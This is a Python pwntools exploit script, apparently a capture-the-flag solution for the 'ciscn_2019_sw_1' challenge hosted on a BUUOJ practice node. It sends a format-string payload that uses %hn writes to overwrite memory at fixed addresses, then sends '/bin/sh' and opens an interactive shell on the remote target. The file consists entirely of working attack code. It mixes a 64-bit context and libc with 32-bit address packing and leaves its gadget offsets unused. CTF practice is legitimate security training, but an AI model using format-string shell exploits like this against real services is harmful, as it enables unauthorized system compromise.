#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   exp.py
@Time    :   2021/06/30 18:17:21
@Author  :   eur1ka  
@Version :   2.7
@Contact :   eur1ka@163.com
'''
# here put the import lib
from pwn import *
from LibcSearcher import *
import pwnlib
debug = 0
context.log_level = 'debug'
context.arch = 'amd64'
if debug:
    # sh = process(['./'],env={'LD_PRELOAD':'/home/eur1ka/Desktop/Pwn/libc_file/16-64-libc-2.23.so'})
    sh = process('./ciscn_2019_sw_1')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    one_offset = [0x45226,0x4527a,0xf03a4,0xf1247]
else:
    IP = 'node3.buuoj.cn'
    port = 28626
    sh = remote(IP,port)
    libc = ELF('/home/eur1ka/Desktop/Pwn/libc_file/16-64-libc-2.23.so')
    one_offset = [0x45216,0x4526a,0xf02a4,0xf1147]
elf = ELF('ciscn_2019_sw_1')


payload = b"%2052c%13$hn%31692c%14$hn%356c%15$hn" + p32(0x804989c + 2) + p32(0x804989c) + p32(0x804979c)
sh.recvline()
sh.sendline(payload)
sleep(1)
sh.sendline("/bin/sh")
sh.interactive()